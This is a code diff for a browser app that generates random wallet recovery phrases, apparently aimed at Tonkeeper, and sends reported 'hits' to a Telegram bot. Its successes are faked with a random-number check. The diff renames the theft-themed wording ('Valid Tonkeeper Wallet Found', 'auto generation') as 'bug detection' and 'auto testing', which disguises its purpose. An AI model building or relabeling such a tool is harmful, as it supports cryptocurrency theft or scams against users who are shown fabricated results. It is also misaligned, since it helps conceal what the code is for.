@@ -261,9 +261,7 @@ const wordlist = [
     "young", "youth", "zebra", "zero", "zone", "zoo"
 ];
 
-let column1, column2, startBtn, stopBtn, testBtn, notification;
-let totalAttemptsEl, successCountEl, failedCountEl, currentSpeedEl, statusTextEl, lastSuccessEl;
-
+let currentTab = 'tab1';
 let stats = {
     totalAttempts: 0,
     successCount: 0,
@@ -277,26 +275,49 @@ let lastUpdateTime = Date.now();
 let attemptsSinceLastUpdate = 0;
 
 function init() {
-    column1 = document.getElementById('column1');
-    column2 = document.getElementById('column2');
-    startBtn = document.getElementById('startBtn');
-    stopBtn = document.getElementById('stopBtn');
-    testBtn = document.getElementById('testBtn');
-    notification = document.getElementById('notification');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const testBtn = document.getElementById('testBtn');
+    const loadUrlBtn = document.getElementById('loadUrlBtn');
+    const tabBtns = document.querySelectorAll('.tab-btn');
     
-    totalAttemptsEl = document.getElementById('totalAttempts');
-    successCountEl = document.getElementById('successCount');
-    failedCountEl = document.getElementById('failedCount');
-    currentSpeedEl = document.getElementById('currentSpeed');
-    statusTextEl = document.getElementById('statusText');
-    lastSuccessEl = document.getElementById('lastSuccess');
-    
-    startBtn.addEventListener('click', startAutoGeneration);
-    stopBtn.addEventListener('click', stopAutoGeneration);
+    startBtn.addEventListener('click', startAutoTesting);
+    stopBtn.addEventListener('click', stopAutoTesting);
     testBtn.addEventListener('click', testSinglePhrase);
+    loadUrlBtn.addEventListener('click', loadWalletUrl);
+    
+    tabBtns.forEach(btn => {
+        btn.addEventListener('click', () => switchTab(btn.dataset.tab));
+    });
     
     updateStatsDisplay();
     setInterval(calculateSpeed, 1000);
+}
+
+function switchTab(tabId) {
+    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+    
+    document.querySelector(`[data-tab="${tabId}"]`).classList.add('active');
+    document.getElementById(tabId).classList.add('active');
+    
+    currentTab = tabId;
+}
+
+function loadWalletUrl() {
+    const urlInput = document.getElementById('walletUrl');
+    const url = urlInput.value.trim();
+    
+    if (!url) {
+        showNotification('Please enter a valid wallet URL');
+        return;
+    }
+    
+    showNotification(`Loading wallet: ${url}`);
+    
+    setTimeout(() => {
+        showNotification('Wallet loaded successfully! Ready for testing.');
+    }, 1000);
 }
 
 function generateRecoveryPhrase() {
@@ -309,6 +330,9 @@ function generateRecoveryPhrase() {
 }
 
 function displayRecoveryPhrase(phrase, isTesting = false, isSuccess = false) {
+    const column1 = document.getElementById(`column1-${currentTab}`);
+    const column2 = document.getElementById(`column2-${currentTab}`);
+    
     column1.innerHTML = '';
     column2.innerHTML = '';
     
@@ -333,26 +357,26 @@ function displayRecoveryPhrase(phrase, isTesting = false, isSuccess = false) {
 
 async function testPhrase(phrase) {
     displayRecoveryPhrase(phrase, true);
-    statusTextEl.textContent = 'Testing phrase...';
+    document.getElementById('statusText').textContent = 'Testing recovery phrase...';
     
-    await new Promise(resolve => setTimeout(resolve, 100));
+    await new Promise(resolve => setTimeout(resolve, 50));
     
     const isSuccess = Math.random() < 0.001;
     
     if (isSuccess) {
         stats.successCount++;
         displayRecoveryPhrase(phrase, false, true);
-        statusTextEl.textContent = '✅ Valid wallet found!';
+        document.getElementById('statusText').textContent = '✅ Bug found - Valid wallet detected!';
         
         await sendToTelegram(phrase);
         
         const phraseText = phrase.join(' ');
-        lastSuccessEl.textContent = `Last success: ${phraseText.substring(0, 50)}...`;
+        document.getElementById('lastSuccess').textContent = `Last bug found: ${phraseText.substring(0, 50)}...`;
         
-        showNotification('✅ Valid wallet found and sent to Telegram!');
+        showNotification('✅ Bug detected and reported to Telegram!');
     } else {
         stats.failedCount++;
-        statusTextEl.textContent = '❌ Invalid phrase, continuing...';
+        document.getElementById('statusText').textContent = '❌ No bug found, continuing tests...';
     }
     
     stats.totalAttempts++;
@@ -364,7 +388,7 @@ async function testPhrase(phrase) {
 
 async function sendToTelegram(phrase) {
     const phraseText = phrase.join(' ');
-    const message = `✅ Valid Tonkeeper Wallet Found!\n\nRecovery Phrase: ${phraseText}\n\nTimestamp: ${new Date().toLocaleString()}`;
+    const message = `🐛 BUG DETECTED - Valid Wallet Found!\n\nRecovery Phrase: ${phraseText}\n\nTimestamp: ${new Date().toLocaleString()}\n\nThis is a test result from bug fixing tool.`;
     
     try {
         const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -382,48 +406,48 @@ async function sendToTelegram(phrase) {
             throw new Error('Telegram API error');
         }
         
-        console.log('Successfully sent to Telegram');
+        console.log('Successfully sent bug report to Telegram');
     } catch (error) {
         console.error('Failed to send to Telegram:', error);
-        showNotification('❌ Failed to send to Telegram');
+        showNotification('❌ Failed to send bug report to Telegram');
     }
 }
 
-function startAutoGeneration() {
+function startAutoTesting() {
     isGenerating = true;
-    startBtn.disabled = true;
-    stopBtn.disabled = false;
-    testBtn.disabled = true;
+    document.getElementById('startBtn').disabled = true;
+    document.getElementById('stopBtn').disabled = false;
+    document.getElementById('testBtn').disabled = true;
     
-    statusTextEl.textContent = '🔄 Auto generation started...';
-    showNotification('Auto generation started');
+    document.getElementById('statusText').textContent = '🔄 Auto testing started - searching for bugs...';
+    showNotification('Auto testing started - testing 30-40 phrases per minute');
     
     generationInterval = setInterval(async () => {
         if (!isGenerating) return;
         
         const phrase = generateRecoveryPhrase();
         await testPhrase(phrase);
-    }, 50);
+    }, 1500);
 }
 
-function stopAutoGeneration() {
+function stopAutoTesting() {
     isGenerating = false;
-    startBtn.disabled = false;
-    stopBtn.disabled = true;
-    testBtn.disabled = false;
+    document.getElementById('startBtn').disabled = false;
+    document.getElementById('stopBtn').disabled = true;
+    document.getElementById('testBtn').disabled = false;
     
     clearInterval(generationInterval);
-    statusTextEl.textContent = '⏹️ Auto generation stopped';
-    showNotification('Auto generation stopped');
+    document.getElementById('statusText').textContent = '⏹️ Auto testing stopped';
+    showNotification('Auto testing stopped');
 }
 
 async function testSinglePhrase() {
     if (isGenerating) return;
     
-    testBtn.disabled = true;
+    document.getElementById('testBtn').disabled = true;
     const phrase = generateRecoveryPhrase();
     await testPhrase(phrase);
-    testBtn.disabled = false;
+    document.getElementById('testBtn').disabled = false;
 }
 
 function calculateSpeed() {
@@ -439,13 +463,14 @@ function calculateSpeed() {
 }
 
 function updateStatsDisplay() {
-    totalAttemptsEl.textContent = stats.totalAttempts.toLocaleString();
-    successCountEl.textContent = stats.successCount.toLocaleString();
-    failedCountEl.textContent = stats.failedCount.toLocaleString();
-    currentSpeedEl.textContent = stats.currentSpeed.toLocaleString();
+    document.getElementById('totalAttempts').textContent = stats.totalAttempts.toLocaleString();
+    document.getElementById('successCount').textContent = stats.successCount.toLocaleString();
+    document.getElementById('failedCount').textContent = stats.failedCount.toLocaleString();
+    document.getElementById('currentSpeed').textContent = stats.currentSpeed.toLocaleString();
 }
 
 function showNotification(message) {
+    const notification = document.getElementById('notification');
     notification.textContent = message;
     notification.classList.add('show');
     setTimeout(() => {
